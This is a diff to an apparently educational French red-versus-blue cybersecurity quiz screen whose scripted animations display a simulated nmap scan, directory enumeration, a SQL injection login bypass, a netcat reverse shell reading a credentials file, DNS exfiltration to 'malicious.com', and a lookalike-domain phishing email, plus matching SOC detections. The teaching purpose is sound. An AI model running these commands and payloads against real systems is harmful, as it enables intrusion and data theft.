@@ -5,7 +5,7 @@
     <title>Cyber Écran Principal</title>
     <script src="https://unpkg.com/mqtt/dist/mqtt.min.js"></script>
     <style>
-        body { background-color: #020617; color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 40px; overflow: hidden; }
+        body { background-color: #020617; color: white; font-family: 'Segoe UI', sans-serif; margin: 0; padding: 40px; overflow: hidden; }
         .header { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #334155; padding-bottom: 20px; }
         h1 { margin: 0; color: #22d3ee; text-transform: uppercase; }
         .counter { font-size: 24px; color: #4ade80; background: #0f172a; padding: 10px 20px; border-radius: 8px; border: 1px solid #4ade80; }
@@ -23,40 +23,56 @@
         .success { color: #4ade80; } .fail { color: #ef4444; }
         .stats-msg { font-size: 28px; color: #cbd5e1; display: block; margin-top: 10px; font-weight: normal; }
 
-        /* --- SYSTÈME D'ANIMATIONS PLEIN ÉCRAN --- */
+        /* SCOREBOARD FIN */
+        #scoreboard { display: none; text-align: center; margin-top: 100px; }
+        .score-box { display: flex; justify-content: center; gap: 50px; margin-top: 50px; }
+        .score-card { background: #1e293b; padding: 40px; border-radius: 15px; width: 300px; }
+        .score-red { border: 4px solid #ef4444; } .score-blue { border: 4px solid #3b82f6; }
+        .score-number { font-size: 80px; font-weight: bold; margin: 20px 0; }
+
+        /* --- ANIMATIONS PLEIN ÉCRAN --- */
         #anim-layer { display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: #020617; z-index: 9999; padding: 20px; box-sizing: border-box; }
-        .anim-window { width: 100%; height: 100%; border-radius: 8px; overflow: hidden; display: none; flex-direction: column; }
-        .window-header { background: #334155; padding: 10px; display: flex; align-items: center; font-weight: bold; font-family: monospace;}
+        .anim-window { width: 100%; height: 100%; border-radius: 8px; overflow: hidden; display: none; flex-direction: column; border: 1px solid #334155; }
+        .window-header { background: #1e293b; padding: 10px; display: flex; align-items: center; font-weight: bold; font-family: monospace;}
         .dots { display: flex; gap: 5px; margin-right: 15px; }
         .dots div { width: 12px; height: 12px; border-radius: 50%; }
         .dot-r { background: #ef4444; } .dot-y { background: #eab308; } .dot-g { background: #22c55e; }
         
         /* Terminal */
-        #terminal { background: #000; font-family: 'Courier New', Courier, monospace; color: #0f0; padding: 20px; flex: 1; font-size: 22px; text-align: left;}
+        #terminal { background: #000; font-family: 'Courier New', Courier, monospace; color: #d1d5db; padding: 20px; flex: 1; font-size: 20px; text-align: left; overflow: hidden; white-space: pre;}
+        .term-green { color: #22c55e; } .term-red { color: #ef4444; } .term-blue { color: #3b82f6; }
         
-        /* Browser */
-        #browser { background: #fff; color: #000; flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; }
-        .url-bar { background: #f1f5f9; padding: 10px; width: 100%; border-bottom: 2px solid #cbd5e1; text-align: center; color: #475569; font-family: monospace; font-size: 18px;}
-        .browser-content { font-size: 24px; text-align: center; padding: 40px; }
-        .fake-input { border: 2px solid #cbd5e1; padding: 10px; border-radius: 4px; font-size: 20px; width: 300px; margin: 10px; display: block;}
+        /* Site Web Realiste */
+        #browser { background: #fff; color: #000; flex: 1; display: flex; flex-direction: column; overflow-y: auto;}
+        .url-bar { background: #e2e8f0; padding: 10px; width: 100%; border-bottom: 1px solid #cbd5e1; text-align: left; color: #475569; font-family: monospace; font-size: 18px; display:flex; align-items:center; gap:10px;}
+        .url-input { background: white; padding: 5px 10px; border-radius: 20px; border: 1px solid #94a3b8; flex:1;}
+        .st-nav { background: #0f172a; color: white; padding: 20px; display:flex; justify-content: space-between; font-weight: bold;}
+        .st-hero { background: linear-gradient(135deg, #1e293b 0%, #0f172a 100%); color: white; padding: 60px 20px; text-align: center; }
+        .st-content { padding: 40px; text-align: center; }
+        .st-btn { background: #22d3ee; color: #0f172a; padding: 10px 20px; border:none; border-radius: 5px; font-weight: bold; font-size: 18px;}
+        .st-form { background: #f8fafc; padding: 40px; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); width: 400px; margin: 50px auto; }
+        .fake-input { border: 1px solid #cbd5e1; padding: 10px; border-radius: 4px; font-size: 20px; width: 100%; margin: 10px 0; display: block; box-sizing: border-box; background: white;}
         
-        /* SOC Dashboard */
-        #soc { background: #0f172a; flex: 1; padding: 20px; display: flex; flex-direction: column; }
-        .soc-header { color: #3b82f6; font-size: 28px; border-bottom: 2px solid #1e293b; padding-bottom: 10px; margin-bottom: 20px; text-transform: uppercase; }
-        .soc-alert { background: #7f1d1d; color: #fca5a5; padding: 20px; border-radius: 8px; font-size: 24px; font-weight: bold; margin-bottom: 20px; display: none; border: 2px solid #ef4444; animation: blink 1s infinite;}
-        .soc-logs { background: #020617; color: #94a3b8; font-family: monospace; font-size: 18px; padding: 10px; height: 100%; overflow-y: hidden; text-align: left;}
-        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
+        /* Dashboard SOC Kibana */
+        #soc { background: #020617; flex: 1; padding: 15px; display: grid; grid-template-columns: 1fr 2fr; grid-template-rows: auto 1fr; gap: 15px; }
+        .k-header { grid-column: 1 / -1; background: #0f172a; border: 1px solid #1e293b; padding: 15px; display: flex; justify-content: space-between; align-items: center; }
+        .k-panel { background: #0f172a; border: 1px solid #1e293b; padding: 15px; display: flex; flex-direction: column; overflow: hidden;}
+        .k-title { color: #94a3b8; font-size: 14px; text-transform: uppercase; border-bottom: 1px solid #1e293b; padding-bottom: 8px; margin-bottom: 10px; font-weight: bold;}
+        .k-metric { font-size: 48px; color: #fff; text-align: center; margin: auto; font-weight: bold;}
+        .k-logline { font-family: monospace; font-size: 14px; color: #cbd5e1; margin-bottom: 4px; border-bottom: 1px solid #1e293b; padding-bottom: 4px;}
+        .k-alert { background: rgba(239,68,68,0.2); border-left: 4px solid #ef4444; color: #fca5a5; }
+        .k-warn { background: rgba(234,179,8,0.2); border-left: 4px solid #eab308; color: #fde047; }
+        .k-success { background: rgba(34,197,94,0.2); border-left: 4px solid #22c55e; color: #86efac; }
 
         /* Mail Phishing */
         #mail { background: #f8fafc; color: #334155; flex: 1; padding: 40px; text-align: left; }
-        .mail-header { border-bottom: 1px solid #cbd5e1; padding-bottom: 20px; margin-bottom: 20px; font-size: 22px; }
 
         .hidden { display: none !important; }
     </style>
 </head>
 <body>
 
-    <div class="header">
+    <div class="header" id="top-header">
         <h1>Opération SafeTech</h1>
         <div class="counter" id="voters-count">En attente de joueurs...</div>
     </div>
@@ -74,39 +90,69 @@
         <div id="result-msg"></div>
     </div>
 
+    <div id="scoreboard">
+        <h1 style="font-size: 60px;">🏁 SIMULATION TERMINÉE 🏁</h1>
+        <div class="score-box">
+            <div class="score-card score-red">
+                <h2>RED TEAM</h2>
+                <div class="score-number" style="color: #ef4444;" id="final-red">0</div>
+                <div>Questions réussies</div>
+            </div>
+            <div class="score-card score-blue">
+                <h2>BLUE TEAM</h2>
+                <div class="score-number" style="color: #3b82f6;" id="final-blue">0</div>
+                <div>Questions réussies</div>
+            </div>
+        </div>
+        <h2 id="winner-text" style="font-size: 40px; margin-top: 50px;"></h2>
+    </div>
+
     <div id="anim-layer">
         
         <div class="anim-window" id="win-terminal">
-            <div class="window-header"><div class="dots"><div class="dot-r"></div><div class="dot-y"></div><div class="dot-g"></div></div> root@kali:~</div>
+            <div class="window-header"><div class="dots"><div class="dot-r"></div><div class="dot-y"></div><div class="dot-g"></div></div> Terminal (Kali Linux)</div>
             <div id="terminal"></div>
         </div>
 
         <div class="anim-window" id="win-browser">
             <div class="window-header"><div class="dots"><div class="dot-r"></div><div class="dot-y"></div><div class="dot-g"></div></div> Navigateur Web</div>
-            <div class="url-bar" id="browser-url">https://safetech.com</div>
-            <div id="browser" class="browser-content"></div>
+            <div class="url-bar">🔒 <div class="url-input" id="browser-url">https://safetech.com</div></div>
+            <div id="browser"></div>
         </div>
 
         <div class="anim-window" id="win-soc">
-            <div class="window-header"><div class="dots"><div class="dot-r"></div><div class="dot-y"></div><div class="dot-g"></div></div> SafeTech SIEM / SOC</div>
+            <div class="window-header"><div class="dots"><div class="dot-r"></div><div class="dot-y"></div><div class="dot-g"></div></div> SafeTech SIEM (Kibana)</div>
             <div id="soc">
-                <div class="soc-header">📊 Security Operations Center</div>
-                <div class="soc-alert" id="soc-alert"></div>
-                <div class="soc-logs" id="soc-logs"></div>
+                <div class="k-header">
+                    <div style="font-size: 24px; font-weight:bold; color: #38bdf8;">📊 Elastic SIEM | SafeTech</div>
+                    <div style="color: #4ade80;" id="soc-status">● System Healthy</div>
+                </div>
+                <div class="k-panel">
+                    <div class="k-title">Niveau de Menace</div>
+                    <div class="k-metric" id="soc-threat">LOW</div>
+                </div>
+                <div class="k-panel" style="grid-row: 2 / 3;">
+                    <div class="k-title">Alertes Détectées</div>
+                    <div id="soc-alerts" style="overflow-y: auto;"></div>
+                </div>
+                <div class="k-panel" style="grid-row: 2 / 3;">
+                    <div class="k-title">Live Log Stream</div>
+                    <div id="soc-logs" style="overflow-y: auto;"></div>
+                </div>
             </div>
         </div>
 
         <div class="anim-window" id="win-mail">
-            <div class="window-header"><div class="dots"><div class="dot-r"></div><div class="dot-y"></div><div class="dot-g"></div></div> Boîte de réception</div>
+            <div class="window-header"><div class="dots"><div class="dot-r"></div><div class="dot-y"></div><div class="dot-g"></div></div> Outlook Web</div>
             <div id="mail">
-                <div class="mail-header">
+                <div style="border-bottom: 1px solid #cbd5e1; padding-bottom: 20px; margin-bottom: 20px; font-size: 22px;">
                     <strong>De :</strong> admin@safe<span style="color:red; font-weight:bold; background:yellow;">rn</span>ech.com<br>
                     <strong>Objet :</strong> URGENT - Réinitialisation de votre mot de passe<br>
                     <strong>Date :</strong> Aujourd'hui, 09:12
                 </div>
                 <div style="font-size: 20px; line-height: 1.6;">
                     Bonjour,<br><br>Une activité suspecte a été détectée sur votre compte. Veuillez cliquer sur le bouton ci-dessous pour confirmer votre identité et sécuriser votre accès.<br><br>
-                    <button style="background:#2563eb; color:white; padding:15px; border:none; font-size:18px; border-radius:5px; margin-top:20px;">Sécuriser mon compte</button>
+                    <button style="background:#2563eb; color:white; padding:15px; border:none; font-size:18px; border-radius:5px; margin-top:20px; cursor:pointer;">Sécuriser mon compte</button>
                 </div>
             </div>
         </div>
@@ -121,6 +167,8 @@
         client.on('message', (t, msg) => {
             const data = JSON.parse(msg.toString());
             
+            if(data.type === 'STATE' && data.phase === 'RESET') { location.reload(); return; }
+
             if (data.type === 'VOTER_UPDATE') {
                 document.getElementById('voters-count').innerText = `${data.votes} / ${data.totalTeam} ont voté`;
             }
@@ -128,10 +176,12 @@
             if (data.type === 'STATE') {
                 const qc = document.getElementById('question-container');
                 const animLayer = document.getElementById('anim-layer');
+                const scoreboard = document.getElementById('scoreboard');
                 
                 if (data.phase === 'VOTING') {
+                    scoreboard.style.display = 'none';
                     qc.classList.remove('hidden');
-                    animLayer.style.display = 'none'; // Cache les animations
+                    animLayer.style.display = 'none';
                     
                     document.getElementById('result-msg').innerHTML = ""; 
                     document.getElementById('result-msg').className = "";
@@ -157,8 +207,9 @@
                 }
                 
                 if (data.phase === 'RESULT') {
-                    qc.classList.remove('hidden'); // Assure que la div question est là si l'écran est refresh pendant le RESULT
+                    qc.classList.remove('hidden'); 
                     animLayer.style.display = 'none';
+                    scoreboard.style.display = 'none';
                     
                     let correctBox = document.getElementById('disp-opt'+data.correctIndex);
                     correctBox.style.cssText = "background-color: #064e3b !important; border-color: #4ade80 !important;";
@@ -176,100 +227,162 @@
                 }
 
                 if (data.phase === 'ANIMATION') {
-                    qc.classList.remove('hidden'); // Laisse l'UI de base
+                    qc.classList.remove('hidden'); 
                     animLayer.style.display = 'block'; 
                     document.querySelectorAll('.anim-window').forEach(el => el.style.display = 'none');
                     runAnimation(data.animType);
                 }
+
+                if (data.phase === 'END_GAME') {
+                    qc.classList.add('hidden');
+                    animLayer.style.display = 'none';
+                    document.getElementById('top-header').style.display = 'none';
+                    scoreboard.style.display = 'block';
+                    
+                    document.getElementById('final-red').innerText = data.scores.red;
+                    document.getElementById('final-blue').innerText = data.scores.blue;
+
+                    let winnerText = document.getElementById('winner-text');
+                    if(data.scores.red > data.scores.blue) { winnerText.innerHTML = "🏆 VICTOIRE DE LA <span style='color:#ef4444'>RED TEAM</span> ! L'entreprise est compromise."; }
+                    else if(data.scores.blue > data.scores.red) { winnerText.innerHTML = "🏆 VICTOIRE DE LA <span style='color:#3b82f6'>BLUE TEAM</span> ! Le système a tenu bon."; }
+                    else { winnerText.innerHTML = "🤝 ÉGALITÉ PARFAITE !"; }
+                }
             }
         });
 
-        // --- MOTEUR D'ANIMATIONS (IDENTIQUE) ---
+        // --- MOTEUR D'ANIMATIONS EXACTES ---
         async function runAnimation(type) {
             const delay = ms => new Promise(res => setTimeout(res, ms));
 
-            const termWin = document.getElementById('win-terminal');
-            const term = document.getElementById('terminal');
-            const socWin = document.getElementById('win-soc');
-            const socLogs = document.getElementById('soc-logs');
-            const socAlert = document.getElementById('soc-alert');
-            const webWin = document.getElementById('win-browser');
-            const web = document.getElementById('browser');
-            const urlBar = document.getElementById('browser-url');
+            const termWin = document.getElementById('win-terminal'); const term = document.getElementById('terminal');
+            const webWin = document.getElementById('win-browser'); const web = document.getElementById('browser'); const urlBar = document.getElementById('browser-url');
+            const socWin = document.getElementById('win-soc'); const sLogs = document.getElementById('soc-logs'); const sAlerts = document.getElementById('soc-alerts');
+            const sThreat = document.getElementById('soc-threat'); const sStatus = document.getElementById('soc-status');
             const mailWin = document.getElementById('win-mail');
 
-            term.innerHTML = ""; socLogs.innerHTML = ""; socAlert.style.display = "none"; web.innerHTML = "";
+            // Resets
+            term.innerHTML = ""; sLogs.innerHTML = ""; sAlerts.innerHTML = ""; web.innerHTML = "";
+            sThreat.innerText = "LOW"; sThreat.style.color = "#4ade80"; sStatus.innerText = "● System Healthy"; sStatus.style.color = "#4ade80";
+
+            // Helper SOC Log
+            const addLog = (text, type="normal") => {
+                let cl = "k-logline"; if(type==="alert") cl+=" k-alert"; else if(type==="warn") cl+=" k-warn"; else if(type==="success") cl+=" k-success";
+                sLogs.innerHTML = `<div class="${cl}">[${new Date().toLocaleTimeString()}] ${text}</div>` + sLogs.innerHTML;
+            };
 
             if(type === 'nmap') {
                 termWin.style.display = "flex";
-                const lines = ["root@kali:~# nmap -sV -p- 185.22.44.1", "Starting Nmap 7.92...", "Scanning 185.22.44.1 [65535 ports]", "<span style='color:red'>[+] Discovered open port 80/tcp (http)</span>", "<span style='color:red'>[+] Discovered open port 22/tcp (ssh)</span>", "Nmap done: 1 IP scanned in 12.4 seconds."];
-                for(let l of lines) { term.innerHTML += l + "<br>"; await delay(600); }
-            } else if(type === 'soc-block') {
-                socWin.style.display = "flex";
-                socLogs.innerHTML += "System OK. Listening for events...<br>"; await delay(1000);
-                socAlert.style.display = "block"; socAlert.innerHTML = "⚠️ ALERTE : SCAN DE PORTS MASSIF DÉTECTÉ (IP: 104.22.1.8)"; await delay(2000);
-                socLogs.innerHTML += "<span style='color:#3b82f6'>[ACTION AUTOMATIQUE] Création règle iptables...</span><br>"; await delay(1000);
-                socLogs.innerHTML += "<span style='color:#4ade80'>[SUCCÈS] IP 104.22.1.8 bloquée. Menace neutralisée.</span><br>";
-                socAlert.innerHTML = "✅ MENACE ÉCARTÉE"; socAlert.style.background = "#064e3b"; socAlert.style.borderColor = "#4ade80";
-            } else if (type === 'gobuster') {
-                webWin.style.display = "flex";
-                urlBar.innerText = "https://safetech.com";
-                web.innerHTML = "<h1>Bienvenue sur SafeTech</h1><p>Leader en innovation.</p>";
-                await delay(2000);
+                term.innerHTML = "root@kali:~# nmap -sV 185.22.44.1<br>"; await delay(800);
+                term.innerHTML += "Starting Nmap 7.95 ( https://nmap.org ) at " + new Date().toISOString().split('T')[0] + " 23:04 CEST<br>"; await delay(1000);
+                term.innerHTML += "Nmap scan report for safetech.com (185.22.44.1)<br>Host is up (0.00019s latency).<br><br>"; await delay(1000);
+                term.innerHTML += "PORT     STATE SERVICE VERSION<br>";
+                term.innerHTML += "<span class='term-green'>80/tcp   open  http    nginx 1.31.1</span><br>"; await delay(500);
+                term.innerHTML += "<span class='term-green'>22/tcp   open  ssh     OpenSSH 8.9p1</span><br><br>"; await delay(800);
+                term.innerHTML += "Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>";
+                term.innerHTML += "Nmap done: 1 IP address (1 host up) scanned in 6.50 seconds";
+            } 
+            
+            else if(type === 'soc-block') {
+                socWin.style.display = "grid";
+                addLog("Firewall policy loaded."); await delay(500);
+                addLog("TCP connection from 104.22.1.8 on port 22"); await delay(200);
+                addLog("TCP connection from 104.22.1.8 on port 80"); await delay(200);
+                for(let i=0; i<5; i++) { addLog(`TCP connection from 104.22.1.8 on port ${Math.floor(Math.random()*60000)}`, "warn"); await delay(100); }
+                sThreat.innerText = "HIGH"; sThreat.style.color = "#ef4444"; sStatus.innerText = "● Attack Detected"; sStatus.style.color = "#ef4444";
+                sAlerts.innerHTML = `<div class="k-logline k-alert">[CRITICAL] Port Scan Detected from 104.22.1.8</div>`; await delay(1000);
+                addLog("Executing Active Response: BAN IP 104.22.1.8", "success"); await delay(500);
+                sAlerts.innerHTML += `<div class="k-logline k-success">[RESOLVED] Source IP added to Drop List</div>`;
+                sThreat.innerText = "MODERATE"; sThreat.style.color = "#eab308";
+            } 
+            
+            else if (type === 'gobuster') {
+                webWin.style.display = "flex"; urlBar.innerText = "https://safetech.com";
+                web.innerHTML = `<div class="st-nav"><div>SafeTech</div><div>Services | Contact | Login</div></div>
+                                 <div class="st-hero"><h1>La Sécurité de Demain</h1><p>Protégez vos données avec nos solutions Cloud.</p><br><button class="st-btn">Découvrir</button></div>`;
+                await delay(2500);
                 webWin.style.display = "none"; termWin.style.display = "flex"; 
-                const lines = ["root@kali:~# gobuster dir -u https://safetech.com -w common.txt", "Starting gobuster...", "/.git/ (Status: 403)", "<span style='color:red'>/admin (Status: 200) [Size: 1043]</span>", "<span style='color:red'>/uploads (Status: 200) [Size: 40]</span>"];
-                for(let l of lines) { term.innerHTML += l + "<br>"; await delay(500); }
-            } else if (type === 'soc-404') {
-                socWin.style.display = "flex";
-                for(let i=0; i<15; i++) { socLogs.innerHTML += `[${new Date().toLocaleTimeString()}] WARNING: HTTP 404 on /secret_dir from 104.22.1.8<br>`; await delay(100); }
-                socAlert.style.display = "block"; socAlert.innerHTML = "⚠️ FAIL2BAN : ACTIVITÉ ANORMALE DÉTECTÉE (Trop de 404)"; await delay(1500);
-                socLogs.innerHTML += "<br><span style='color:#4ade80'>[FAIL2BAN] Banning IP 104.22.1.8 for 24 hours.</span><br>";
-            } else if (type === 'sqli') {
-                webWin.style.display = "flex";
-                urlBar.innerText = "https://safetech.com/admin";
-                web.innerHTML = "<h2>Portail Administrateur</h2><span class='fake-input'>Username</span><span class='fake-input'>Password</span>";
-                await delay(1500);
-                web.innerHTML = "<h2>Portail Administrateur</h2><span class='fake-input'>admin' OR '1'='1</span><span class='fake-input'>***</span>";
+                term.innerHTML = "root@kali:~# gobuster dir -u https://safetech.com -w common.txt<br>"; await delay(500);
+                const gbHeader = `===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     https://safetech.com<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                common.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster in directory enumeration mode<br>===============================================================<br>`;
+                term.innerHTML += gbHeader; await delay(1000);
+                term.innerHTML += "<span class='term-green'>/index                (Status: 200) [Size: 219]</span><br>"; await delay(600);
+                term.innerHTML += "<span class='term-green'>/about                (Status: 200) [Size: 140]</span><br>"; await delay(800);
+                term.innerHTML += "<span class='term-red'>/admin                (Status: 200) [Size: 285]</span><br>"; await delay(500);
+                term.innerHTML += "<span class='term-red'>/uploads              (Status: 301) [Size: 0]</span><br>"; await delay(1000);
+                term.innerHTML += "===============================================================<br>Finished<br>===============================================================";
+            } 
+            
+            else if (type === 'soc-404') {
+                socWin.style.display = "grid"; sThreat.innerText = "MODERATE"; sThreat.style.color = "#eab308";
+                addLog("Nginx log ingestion active..."); await delay(500);
+                for(let i=0; i<15; i++) { addLog(`[104.22.1.8] GET /${Math.random().toString(36).substring(7)} HTTP/1.1 404`, "warn"); await delay(100); }
+                sAlerts.innerHTML = `<div class="k-logline k-alert">[WARNING] High Rate of 404 Errors (Dirbusting)</div>`; await delay(1000);
+                addLog("Fail2Ban trigger met. Banning IP 104.22.1.8 for 24h", "success");
+                sAlerts.innerHTML += `<div class="k-logline k-success">[ACTION] Jail 'nginx-req-limit' enacted.</div>`;
+            } 
+            
+            else if (type === 'sqli') {
+                webWin.style.display = "flex"; urlBar.innerText = "https://safetech.com/admin";
+                web.innerHTML = `<div class="st-nav"><div>SafeTech Intranet</div></div><div class="st-form"><h2 style="color:#0f172a; text-align:center;">Accès Restreint</h2><input class="fake-input" value="Username"><input class="fake-input" type="password" value="Password"><button class="st-btn" style="width:100%; margin-top:20px;">Connexion</button></div>`;
+                await delay(2000);
+                document.querySelectorAll('.fake-input')[0].value = "admin' OR '1'='1";
                 await delay(1000);
-                web.innerHTML = "<h2 style='color:red'>Accès Refusé (Erreur SQL)</h2>";
+                web.innerHTML = `<div style="padding:40px; text-align:center; color:red;"><h2>Internal Server Error (500)</h2><p>SQL Syntax Error near ''1'='1'</p></div>`;
                 await delay(1500);
-                web.innerHTML = "<h2>Portail Administrateur</h2><span class='fake-input'>admin' OR 1=1 --</span><span class='fake-input'>***</span>";
-                await delay(1000);
-                web.innerHTML = "<h1 style='color:green'>🔓 DASHBOARD ADMINISTRATEUR CONNECTÉ</h1><p>Bienvenue SuperAdmin.</p>";
-            } else if (type === 'soc-sqli') {
-                socWin.style.display = "flex";
-                socLogs.innerHTML += "Trafic Web normal...<br>"; await delay(1000);
-                socLogs.innerHTML += `[WAF] <span style='color:red'>SQL Injection Pattern Detected: "OR 1=1 --"</span><br>`; await delay(500);
-                socAlert.style.display = "block"; socAlert.innerHTML = "🛑 WAF: INJECTION SQL BLOQUÉE (IP: 104.22.1.8)";
-            } else if (type === 'reverse-shell') {
+                web.innerHTML = `<div class="st-nav"><div>SafeTech Intranet</div></div><div class="st-form"><h2 style="color:#0f172a; text-align:center;">Accès Restreint</h2><input class="fake-input" value="admin' OR 1=1 --"><input class="fake-input" type="password" value="***"><button class="st-btn" style="width:100%; margin-top:20px;">Connexion</button></div>`;
+                await delay(1500);
+                web.innerHTML = `<div class="st-nav"><div>SafeTech Admin Panel</div><div>Deconnexion</div></div><div class="st-content"><h1 style="color:#22c55e;">🔓 Bienvenue, Administrator</h1><p>Statut du serveur: En ligne</p><br><div style="text-align:left; background:#e2e8f0; padding:20px; border-radius:5px;">📁 Fichiers système<br>📁 Base de données clients<br>📁 Configuration Secrète</div></div>`;
+            } 
+            
+            else if (type === 'soc-sqli') {
+                socWin.style.display = "grid"; sStatus.innerText = "● Shield Active";
+                addLog("WAF Engine Analyzing HTTP Requests..."); await delay(1000);
+                addLog(`[104.22.1.8] POST /admin (Payload: admin' OR 1=1 --)`, "alert"); await delay(500);
+                sThreat.innerText = "HIGH"; sThreat.style.color = "#ef4444";
+                sAlerts.innerHTML = `<div class="k-logline k-alert">[CRITICAL] SQL Injection Payload Detected in POST body</div>`; await delay(800);
+                addLog("ModSecurity Rule ID 942100 Triggered. Dropping request.", "success");
+                sAlerts.innerHTML += `<div class="k-logline k-success">[PREVENTED] WAF blocked SQLi attack.</div>`;
+            } 
+            
+            else if (type === 'reverse-shell') {
                 termWin.style.display = "flex";
-                term.innerHTML = "root@kali:~# nc -lvnp 4444<br>Listening on [0.0.0.0] (family 0, port 4444)<br>"; await delay(1500);
-                term.innerHTML += "<span style='color:red'>Connection received on 185.22.44.1 49302!</span><br>www-data@safetech:/var/www/html$ "; await delay(1000);
-                term.innerHTML += "ls -la<br>index.php<br>config.php<br><span style='color:yellow'>credentialSecure.txt</span><br>"; await delay(1500);
+                term.innerHTML = "root@kali:~# nc -lvnp 4444<br>Listening on [0.0.0.0] (family 0, port 4444)<br>"; await delay(2000);
+                term.innerHTML += "<span class='term-red'>Connection received on 185.22.44.1 49302!</span><br>www-data@safetech:/var/www/html$ "; await delay(1000);
+                term.innerHTML += "ls -la<br>-rw-r--r-- 1 www-data www-data  219 index.php<br>-rw-r--r-- 1 www-data www-data  140 about.php<br><span style='color:yellow'>-rw------- 1 root     root       45 credentialSecure.txt</span><br>"; await delay(1500);
                 term.innerHTML += "www-data@safetech:/var/www/html$ cat credentialSecure.txt<br>"; await delay(1000);
-                term.innerHTML += "<span style='color:red; font-weight:bold; font-size:28px;'>ROOT_PASSWORD=SuperAdmin2026!!!</span><br>";
-            } else if (type === 'soc-priv') {
-                socWin.style.display = "flex";
-                socLogs.innerHTML += "[IAM] User 'stagiaire_bob' logged in.<br>"; await delay(1000);
-                socLogs.innerHTML += "<span style='color:yellow'>[AUDIT] User 'stagiaire_bob' attempting to read /etc/shadow...</span><br>"; await delay(1000);
-                socAlert.style.display = "block"; socAlert.innerHTML = "🛡️ PRINCIPE DU MOINDRE PRIVILÈGE APPLIQUÉ";
-                socLogs.innerHTML += "<span style='color:#4ade80'>[DENIED] Permission refused for 'stagiaire_bob'. Session terminated.</span><br>";
-            } else if (type === 'exfil') {
+                term.innerHTML += "<span class='term-red' style='font-weight:bold; font-size:24px;'>[SYSTEM ROOT CREDENTIALS]<br>USER: root<br>PASS: S@f3T3ch_Admin_2026_!!</span><br>";
+            } 
+            
+            else if (type === 'soc-priv') {
+                socWin.style.display = "grid";
+                addLog("Auth: User 'stagiaire_bob' authenticated successfully."); await delay(1000);
+                addLog("Syscall: 'stagiaire_bob' -> open('/etc/shadow', O_RDONLY)", "warn"); await delay(1000);
+                sThreat.innerText = "ELEVATED"; sThreat.style.color = "#eab308";
+                sAlerts.innerHTML = `<div class="k-logline k-warn">[AUDIT] Unauthorized file access attempt</div>`; await delay(800);
+                addLog("SELinux/AppArmor: Permission denied for 'stagiaire_bob'", "success");
+            } 
+            
+            else if (type === 'exfil') {
                 termWin.style.display = "flex";
-                term.innerHTML = "root@kali:~# python3 dns_exfiltrator.py --file plans_secrets_drone.pdf<br>"; await delay(1000);
-                term.innerHTML += "Encoding file to Base64...<br>Sending DNS queries...<br>"; await delay(500);
-                for(let i=1; i<=10; i++) { term.innerHTML += `<span style='color:yellow'>[+] Query ${i}/450 : ${Math.random().toString(36).substring(2)}.malicious-domain.com</span><br>`; await delay(150); }
-                term.innerHTML += "<span style='color:red; font-weight:bold;'>[✔] EXFILTRATION TERMINÉE. FICHIER RÉCUPÉRÉ.</span>";
-            } else if (type === 'soc-incident') {
-                socWin.style.display = "flex";
-                socLogs.innerHTML += "Monitoring Outbound Traffic...<br>"; await delay(1000);
-                socAlert.style.display = "block"; socAlert.innerHTML = "🚨 FUITE DE DONNÉES EN COURS (ANOMALIE DNS) 🚨";
-                socAlert.style.animation = "blink 0.2s infinite"; await delay(1500);
-                socLogs.innerHTML += "<span style='color:red; font-weight:bold;'>[LOCKDOWN] KILLING ALL EXTERNAL CONNECTIONS.</span><br>"; await delay(1000);
-                socAlert.innerHTML = "🔒 RÉSEAU ISOLÉ. RÉPONSE À INCIDENT ACTIVÉE."; socAlert.style.animation = "none"; socAlert.style.background = "#0f172a";
-            } else if (type === 'phishing') {
-                mailWin.style.display = "block";
-            }
+                term.innerHTML = "root@kali:~# python3 dns_exfil.py -f plans_drone.pdf -d malicious.com<br>"; await delay(1000);
+                term.innerHTML += "Compressing and Base64 Encoding target file...<br>Chunks generated: 200<br>Starting DNS tunneling...<br>"; await delay(500);
+                for(let i=1; i<=15; i++) { term.innerHTML += `<span class='term-blue'>[+] Query: ${Math.random().toString(36).substring(2)}.malicious.com</span><br>`; await delay(80); }
+                term.innerHTML += "... (185 queries omitted) ...<br>"; await delay(500);
+                term.innerHTML += "<span class='term-red' style='font-weight:bold;'>[✔] EXFILTRATION SUCCESSFUL. File reconstructed locally.</span>";
+            } 
+            
+            else if (type === 'soc-incident') {
+                socWin.style.display = "grid";
+                addLog("DNS Traffic Monitor normal."); await delay(1000);
+                for(let i=0; i<6; i++) { addLog(`DNS Query [TXT] -> malicious.com`, "warn"); await delay(100); }
+                sThreat.innerText = "CRITICAL"; sThreat.style.color = "#ef4444"; sThreat.style.animation = "blink 1s infinite";
+                sStatus.innerText = "● BREACH DETECTED"; sStatus.style.color = "#ef4444";
+                sAlerts.innerHTML = `<div class="k-logline k-alert" style="font-size:18px; font-weight:bold;">🚨 [DATA LOSS PREVENTION] DNS Tunneling / Exfiltration Detected</div>`; await delay(1500);
+                addLog("INITIATING INCIDENT RESPONSE PLAYBOOK: ISOLATE_HOST", "alert"); await delay(500);
+                addLog("Network interface eth0 disabled.", "success");
+                sAlerts.innerHTML += `<div class="k-logline k-success">🔒 SERVER QUARANTINED. External routing cut.</div>`;
+            } 
+            
+            else if (type === 'phishing') { mailWin.style.display = "block"; }
         }
     </script>
 </body>
